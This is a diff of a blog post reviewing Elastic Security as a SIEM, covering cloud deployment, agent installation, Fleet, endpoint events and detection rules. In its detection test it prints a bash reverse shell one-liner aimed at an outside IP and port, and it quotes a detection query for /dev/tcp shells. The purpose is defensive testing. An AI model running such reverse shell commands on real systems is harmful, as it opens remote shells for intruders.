@@ -1,24 +1,24 @@
 # Elastic SIEM Review
 
-Who doesn't know Elastic stack? Elasticsearch, logstash, kibana is almost the golden standard for DIY logging solution. They are free, scalable, and have good visualisation. Recently, they expand their games to Cyber Security field with their brand new SIEM solution \(or now called [Elastic Security](https://www.elastic.co/security)\). Are they good enough to be used for your organization? In this post, I will try out their features and give personal verdicts on their current state.
+Who doesn't know Elastic stack? Elasticsearch, logstash, kibana is almost the golden standard for DIY logging solution. They are free, scalable, and have good visualisation. Recently, they expand their games to Cyber Security field with their brand new SIEM solution (or now called [Elastic Security](https://www.elastic.co/security)). Are they good enough to be used for your organization? In this post, I will try out their features and give personal verdicts on their current state.
 
 ## Setting up the Environment
 
 ### Deploying the Elastic Stack
 
-First, let's spin up an elastic stack. To avoid wasting time on setting up the stack deployment, I decided to spin up the cloud version on [https://cloud.elastic.co/](https://cloud.elastic.co/). Setting up is very easy, the UI is beautiful and the experience is good.
+First, let's spin up an elastic stack. To avoid wasting time on setting up the stack deployment, I decided to spin up the cloud version on [https://cloud.elastic.co/](https://cloud.elastic.co). Setting up is very easy, the UI is beautiful and the experience is good.
 
-![](../../../.gitbook/assets/image%20%2842%29.png)
+![](<../../.gitbook/assets/image (42).png>)
 
-After clicking a few buttons, they will automatically setup our elastic cluster on the chosen cloud provider \(in my case, I choose Google Cloud\). They spin up 5 instances across cloud zone: 3 Elasticsearch instances, 2 Kibana instances.
+After clicking a few buttons, they will automatically setup our elastic cluster on the chosen cloud provider (in my case, I choose Google Cloud). They spin up 5 instances across cloud zone: 3 Elasticsearch instances, 2 Kibana instances.
 
-![](../../../.gitbook/assets/image%20%2827%29.png)
+![](<../../.gitbook/assets/image (27).png>)
 
 Upon clicking the "Edit" menu on the sidebar, we will be faced with a beautiful page for configuring our deployments. There are many settings we can change.
 
 * They allow us to modify the Elasticsearch instance size, starting from as low as `30 GB storage | 1 GB RAM | Up to 2.5 vCPU` in hot data tier to something as high as `3000 TB storage | 1.88 TB RAM | 240 vCPU` in frozen data tier. We can also set the availability zone for each configuration.
 * In this page, we can also configure the hot / warm / cold / frozen Elasticsearch configuration.
-* Not only Elasticsearch, we can also configure deployment for Kibana, APM \(App performance monitoring\), and Enterprise Search \(we don't care\).
+* Not only Elasticsearch, we can also configure deployment for Kibana, APM (App performance monitoring), and Enterprise Search (we don't care).
 
 The experience of managing deployment this easily always make me wonder why companies are still hiring many TechOps.
 
@@ -26,13 +26,13 @@ The experience of managing deployment this easily always make me wonder why comp
 Regarding data tier, usually people will separate their data into multiple tiers. Nodes in hot data-tier ingest and process frequently queried data, on the other hand, they want to maximize savings by archiving data on a frozen tier.
 {% endhint %}
 
-![](../../../.gitbook/assets/image%20%2847%29.png)
+![](<../../.gitbook/assets/image (47).png>)
 
 ### Deploying the Agent Node
 
-Before we can view any valuable information, we need to provide data sources to be ingested to the Elasticsearch. For Elastic Security, there are 2 options: using traditional **Beats** \(e.g. Filebeat, metricbeat\) or using their beta **Elastic Agent**. For the sake of living-on-the-edge, I decided to use the elastic agent.
+Before we can view any valuable information, we need to provide data sources to be ingested to the Elasticsearch. For Elastic Security, there are 2 options: using traditional **Beats** (e.g. Filebeat, metricbeat) or using their beta **Elastic Agent**. For the sake of living-on-the-edge, I decided to use the elastic agent.
 
-I deploy a virtual machine using virtualbox with 2 vCPU and 500GB RAM \(which I regret later, since it's too small and freeze a lot!\)
+I deploy a virtual machine using virtualbox with 2 vCPU and 500GB RAM (which I regret later, since it's too small and freeze a lot!)
 
 ```ruby
 Vagrant.configure("2") do |config|
@@ -50,13 +50,13 @@ end
 
 > Elastic Security integrates the free and open Elastic SIEM with Endpoint Security to prevent, detect, and respond to threats. To begin, you’ll need to add security solution related data to the Elastic Stack.
 
-Let's open our Kibana and select **Elastic Security** on the sidebar. Upon opening the Elastic Security page, it's still empty and we are required to add security-related data. There are 3 options: \(1\) Elastic Agent, \(2\) Beats, \(3\) Endpoint Security; which somehow misleading since the "Endpoint Security" is one of the many Elastic Agent integration. So in the end, you only have 2 choices: Beats or Elastic Agent.
+Let's open our Kibana and select **Elastic Security** on the sidebar. Upon opening the Elastic Security page, it's still empty and we are required to add security-related data. There are 3 options: (1) Elastic Agent, (2) Beats, (3) Endpoint Security; which somehow misleading since the "Endpoint Security" is one of the many Elastic Agent integration. So in the end, you only have 2 choices: Beats or Elastic Agent.
 
-![](../../../.gitbook/assets/image%20%2844%29.png)
+![](<../../.gitbook/assets/image (44).png>)
 
 Clicking the Add data with Elastic Agent will redirect us to the tutorial page that provide step-by-step guides to enroll a server using their agent. One more thing to note is **Fleet**. Using Fleet, we can centrally manage the configuration of elastic agents, which seems to be the obvious choice if we want to easily manage agents at scale.
 
-![](../../../.gitbook/assets/image%20%2834%29.png)
+![](<../../.gitbook/assets/image (34).png>)
 
 ## Quick Look on Elastic Agent
 
@@ -66,7 +66,7 @@ The Elastic Agent provides a simple, unified way to add monitoring for logs, met
 
 Installing Elastic Agent in our virtual machine is very simple, with several CLI commands:
 
-```text
+```
 curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-7.13.0-linux-x86_64.tar.gz
 tar xzvf elastic-agent-7.13.0-linux-x86_64.tar.gz
 cd elastic-agent-7.13.0-linux-x86_64
@@ -79,7 +79,7 @@ After installation, there are several things added:
 2. Added a systemd service unit `/etc/systemd/system/elastic-agent.service`
 3. Added directory `/opt/Elastic/Agent`.
 
-```text
+```
 root@agent-01:/# elastic-agent -h
 
 Usage:
@@ -113,7 +113,7 @@ Flags:
 Use "elastic-agent [command] --help" for more information about a command.
 ```
 
-```text
+```
 root@agent-01:/proc/1022# cat /etc/systemd/system/elastic-agent.service
 [Unit]
 Description=Elastic Agent is a unified agent to observe, monitor and protect your system.
@@ -134,7 +134,7 @@ WantedBy=multi-user.target
 
 After installation, we can see that a directory appear on `/opt/Elastic/Agent`. This directory contains all the necessary files for the standalone Elastic Agent to run.
 
-```text
+```
 root@agent-01:/opt/Elastic/Agent# tree -L 2
 .
 ├── LICENSE.txt
@@ -155,7 +155,7 @@ root@agent-01:/opt/Elastic/Agent# tree -L 2
 3 directories, 11 files
 ```
 
-On the root of the directory, it contains the agent configuration `elastic-agent.yml` and `fleet.yml`. In our case, since we enable fleet, the `elastic-agent.yml` only contains information that fleet is enabled \(their config is managed centrally by fleet\). The `fleet.yml` contains the information of the agent and the fleet credentials.
+On the root of the directory, it contains the agent configuration `elastic-agent.yml` and `fleet.yml`. In our case, since we enable fleet, the `elastic-agent.yml` only contains information that fleet is enabled (their config is managed centrally by fleet). The `fleet.yml` contains the information of the agent and the fleet credentials.
 
 {% code title="elastic-agent.yml" %}
 ```yaml
@@ -193,7 +193,7 @@ Next, inside `data` directory, it contains the current `elastic-agent` software 
 
 We can also see that Elastic Agent uses portable softwares contained only within the directory. In `downloads`, we can see the downloaded tar archives. In `install`, we can see the portable `filebeat` and `metricbeat` software files.
 
-```text
+```
 root@agent-01:/opt/Elastic/Agent/data/elastic-agent-054e22# tree . -L 2
 .
 ├── downloads
@@ -228,7 +228,7 @@ root@agent-01:/opt/Elastic/Agent/data/elastic-agent-054e22# tree . -L 2
 └── state.yml
 ```
 
-```text
+```
 root@agent-01:/opt/Elastic/Agent/data/elastic-agent-054e22# tree install/ -L 2
 install/
 ├── filebeat-7.13.0-linux-x86_64
@@ -310,13 +310,13 @@ I enabled the `auditd` integration beforehand, so we can see that the `auditd` l
 
 Our agent visualised in the Kibana dashboard:
 
-![](../../../.gitbook/assets/image%20%2843%29.png)
+![](<../../.gitbook/assets/image (43).png>)
 
 Note that in the dashboard, there are 2 actions available: **unenroll**, and **assign new policy.** Policy basically defines what configuration we want to apply to our agents. In our case, we apply `Default` policy to our agent-01.
 
 Next, let's see what processes are running in our agent.
 
-```text
+```
 root@agent-01:/opt/Elastic/Agent# service elastic-agent status
 ● elastic-agent.service - Elastic Agent is a unified agent to observe, monitor and protect your system.
    Loaded: loaded (/etc/systemd/system/elastic-agent.service; enabled; vendor preset: enabled)
@@ -335,13 +335,13 @@ We see 5 processes: elastic-agent, filebeat, metricbeat, filebeat-monitor, metri
 
 ## Enabling the Elastic Security Endpoint
 
-When I am exploring the Elastic Security Dashboard, an \(ads?\) popup appears which ask me a question whether to enable a feature named **Security Endpoints**. Why not? I decided to test this feature. After following several forms to fill, the system replaced \(or upgraded?\) my agent from **Elastic Agent** to **Elastic Endpoints.** I'm not very sure about the process.
+When I am exploring the Elastic Security Dashboard, an (ads?) popup appears which ask me a question whether to enable a feature named **Security Endpoints**. Why not? I decided to test this feature. After following several forms to fill, the system replaced (or upgraded?) my agent from **Elastic Agent** to **Elastic Endpoints.** I'm not very sure about the process.
 
-![](../../../.gitbook/assets/image%20%2830%29.png)
+![](<../../.gitbook/assets/image (30).png>)
 
 However, I noticed that command `elastic-agent` are no longer working in my agent.
 
-```text
+```
 root@agent-01:/# elastic-agent
 /usr/bin/elastic-agent: 2: exec: /opt/Elastic/Agent/elastic-agent: not found
 
@@ -362,17 +362,17 @@ drwxrwxr-x 4 root root    4096 Jun  1 10:00 data
 -rw------- 1 root root       0 Jun  1 10:00 fleet.yml.lock
 ```
 
-I am not sure whether this is intentional or not. But I suspect this is not intentional, since this means the elastic-agent systemd service should fail when we restart the agent _**\(which later I experience this to be the case, so disappointing!\).**_
+I am not sure whether this is intentional or not. But I suspect this is not intentional, since this means the elastic-agent systemd service should fail when we restart the agent _**(which later I experience this to be the case, so disappointing!).**_
 
-After installing the _Endpoint Security_ integration, we found that our agent are sending additional events as shown below. Most of them are _Process_ events. The rest are _File_ events. These events collection can be configured from the dashboard. In case of Linux and Mac, only **File**, **Process**, and **Network** will be collected; the rest \(such as Registry\) are exclusive to Windows only.
+After installing the _Endpoint Security_ integration, we found that our agent are sending additional events as shown below. Most of them are _Process_ events. The rest are _File_ events. These events collection can be configured from the dashboard. In case of Linux and Mac, only **File**, **Process**, and **Network** will be collected; the rest (such as Registry) are exclusive to Windows only.
 
-![](../../../.gitbook/assets/image%20%2839%29.png)
+![](<../../.gitbook/assets/image (39).png>)
 
 In Windows and Mac, we can enable something called _**Malware Protection**_. Additionally, we can enable _**Ransomware Protection**_ _in Windows._
 
 Now with these additional data sources, we are able to view **Uncommon Process** in the _Hosts_ page. Not very useful for detecting intrusion, but at least it's working. How does this work?
 
-![](../../../.gitbook/assets/image%20%2832%29.png)
+![](<../../.gitbook/assets/image (32).png>)
 
 Note that these uncommon processes will not appear in **Detection** tab, since by default there is no rules to match this list. I suppose this list of _Uncommon processes_ are only for additional information when inspecting a host, basically they are query logs and do some aggregation and filtering.
 
@@ -380,27 +380,27 @@ Note that these uncommon processes will not appear in **Detection** tab, since b
 
 One of the main feature of SIEM is its ability to generate alerts when malicious things happen. Let's test out the detection feature of this Elastic Security!
 
-### Let's try spawning reverse shell <a id="84d8dc1c-84ff-41df-8ef0-cf27bf7e6419"></a>
+### Let's try spawning reverse shell <a href="#84d8dc1c-84ff-41df-8ef0-cf27bf7e6419" id="84d8dc1c-84ff-41df-8ef0-cf27bf7e6419"></a>
 
 Using this payload: `bash -i >& /dev/tcp/157.230.255.84/1337 0>&1`. After executing this command, we didn't see any alerts. We are able to see our bash exec process in the event list, but it didn't trigger any alert, which is disappointing.
 
-![](../../../.gitbook/assets/image%20%2836%29.png)
+![](<../../.gitbook/assets/image (36).png>)
 
 The process event also trigger another _network_ event `network start` with destination of our evil server. So sad that this does not generate alert.
 
-![](../../../.gitbook/assets/image%20%2831%29.png)
+![](<../../.gitbook/assets/image (31).png>)
 
-### Activating the Detection Rule <a id="5be28dc5-2c0b-4e6a-985d-5f4635f4493f"></a>
+### Activating the Detection Rule <a href="#5be28dc5-2c0b-4e6a-985d-5f4635f4493f" id="5be28dc5-2c0b-4e6a-985d-5f4635f4493f"></a>
 
 After being disappointed, I realised that I haven't activated any detection rules. So is this my fault? maybe, but I also blame them for not notifying me that I need to manually activate the detection rules beforehand!
 
 OK enough complaining, so I try activating some Detection Rule, such as "**Potential Reverse Shell Activity via Terminal**".
 
-![](../../../.gitbook/assets/image%20%2837%29.png)
+![](<../../.gitbook/assets/image (37).png>)
 
 We can see that this rule will query the index `auditbeat-*` and `logs-endpoint.events.*` with the following query:
 
-```text
+```
 process where event.type in ("start", "process_started") and
   process.name in ("sh", "bash", "zsh", "dash", "zmodload") and
   process.args:("*/dev/tcp/*", "*/dev/udp/*", "zsh/net/tcp", "zsh/net/udp")
@@ -410,47 +410,46 @@ From quick glimpse on this query, our previous commands should be matched. _Let'
 
 After activating this rules, I wait for around 5 minutes, but no alerts are generated. I understood that the rule is set to be run every several minutes. However when I check in the dashboard, the rule said that it is already _succeeded_ running with the last run is _58 seconds ago_, leading me to another disappointment... If it's already running then why there is no alerts generated!?
 
-![](../../../.gitbook/assets/image%20%2841%29.png)
+![](<../../.gitbook/assets/image (41).png>)
 
 After re-checking the generated events, my reverse shell process is not detected because the `process.args` value is only `bash,-i`. _What?_
 
-![](../../../.gitbook/assets/image%20%2840%29.png)
+![](<../../.gitbook/assets/image (40).png>)
 
-Let's modify the detection rule a bit by adding matching `-i` in `process.args`, who really use the `-i` flag for a legitimate action anyway? But _alas_, we cannot modify the prebuilt rule, so let's just create a new one.[![](Elastic%20Security%20Endpoints%206ae65fa4f46143adbe1b4c6ddf5ef1e0/Untitled%208.png)](Elastic%20Security%20Endpoints%206ae65fa4f46143adbe1b4c6ddf5ef1e0/Untitled%208.png)
+Let's modify the detection rule a bit by adding matching `-i` in `process.args`, who really use the `-i` flag for a legitimate action anyway? But _alas_, we cannot modify the prebuilt rule, so let's just create a new one.
 
-![](../../../.gitbook/assets/image%20%2845%29.png)
+![](<../../.gitbook/assets/image (45).png>)
 
-The form to create a new rule looks very good. We can run `Preview results` to quickly test our query. In the screenshot above, we can see that it match 14 events, which seems correct. Then, we need to define the rule name, description, severity and risk score. We can also define MITRE ATT&CK™ reference, which is nice for further analysis. Then, we can set how often this rules running \(e.g. every 1 minute\), and what action to be taken if threats detected \(e.g. send email or webhook, though this is limited only for paid license\).
+The form to create a new rule looks very good. We can run `Preview results` to quickly test our query. In the screenshot above, we can see that it match 14 events, which seems correct. Then, we need to define the rule name, description, severity and risk score. We can also define MITRE ATT\&CK™ reference, which is nice for further analysis. Then, we can set how often this rules running (e.g. every 1 minute), and what action to be taken if threats detected (e.g. send email or webhook, though this is limited only for paid license).
 
 After I activate this newly created rules, I wait for another 5 minutes. But still, there are no no alerts generated...
 
-When I recheck, the rule is by default set to run every 5 minutes with additional 4 minutes look-back time. Because of this, our new rule did not generate any alerts \(our past reverse shell are more than 10 minutes ago\). We weren't sure if there is any way for backfilling, which is quite disappointing \(again!\).
+When I recheck, the rule is by default set to run every 5 minutes with additional 4 minutes look-back time. Because of this, our new rule did not generate any alerts (our past reverse shell are more than 10 minutes ago). We weren't sure if there is any way for backfilling, which is quite disappointing (again!).
 
 ### Alerts are finally Generated
 
-So I execute our reverse shell payload once again, and finally be happy to see alerts generated. It took around 5 minutes from our payload execution until the alerts generated.[![](Elastic%20Security%20Endpoints%206ae65fa4f46143adbe1b4c6ddf5ef1e0/Untitled%209.png)](Elastic%20Security%20Endpoints%206ae65fa4f46143adbe1b4c6ddf5ef1e0/Untitled%209.png)
+So I execute our reverse shell payload once again, and finally be happy to see alerts generated. It took around 5 minutes from our payload execution until the alerts generated.
 
-![](../../../.gitbook/assets/image%20%2838%29.png)
+![](<../../.gitbook/assets/image (38).png>)
 
 I must admit that their UI is gorgeous, we can open _analyzer_ to view related events and track process generation. For example, from this graph, we can easily see that this reverse shell is coming from a user logged in via `sshd`
 
-![](../../../.gitbook/assets/image%20%2828%29.png)
+![](<../../.gitbook/assets/image (28).png>)
 
-Elastic also provide additional features for incident investigation, namely _timeline_ \(allow us to build timeline by querying some logs\) and _case_ \(allow management to track this issue and connect it to other management system such as Jira\).
+Elastic also provide additional features for incident investigation, namely _timeline_ (allow us to build timeline by querying some logs) and _case_ (allow management to track this issue and connect it to other management system such as Jira).
 
-![](../../../.gitbook/assets/image%20%2835%29.png)
+![](<../../.gitbook/assets/image (35).png>)
 
-### Agent Resource Consumption <a id="18cb770a-091d-4576-821e-c697be24628a"></a>
+### Agent Resource Consumption <a href="#18cb770a-091d-4576-821e-c697be24628a" id="18cb770a-091d-4576-821e-c697be24628a"></a>
 
 We tested this agent on a 500MB RAM virtual machine running in virtualbox. During testing, we see that our agent's RAM is always on almost maximum usage, most of them are eaten up by `elastic-endpoint`, `filebeat`, and `metricbeat` processes. As for CPU, by average around 2% of 2 vCPU is used.
 
-### Anomaly Detection using ML <a id="cc93b45c-7c58-4227-aafd-c4acd72c2290"></a>
+### Anomaly Detection using ML <a href="#cc93b45c-7c58-4227-aafd-c4acd72c2290" id="cc93b45c-7c58-4227-aafd-c4acd72c2290"></a>
 
 Inside the Detections tab, there is a button that allow us to run several ML Jobs. Unfortunately, our we don't have any ML nodes to run those jobs in our Free trial. From a quick glance, this feature utilise the [anomaly detection feature in Elastic](https://www.elastic.co/what-is/elasticsearch-machine-learning). I think this feature is not very useful unless you have a very big log data and got a scalability issue: manual analysis has become out of hand. BTW, this feature is only available if have the paid license.
 
-![](../../../.gitbook/assets/image%20%2846%29.png)
+![](<../../.gitbook/assets/image (46).png>)
 
 
 
 ## TODO: This post is WIP
-
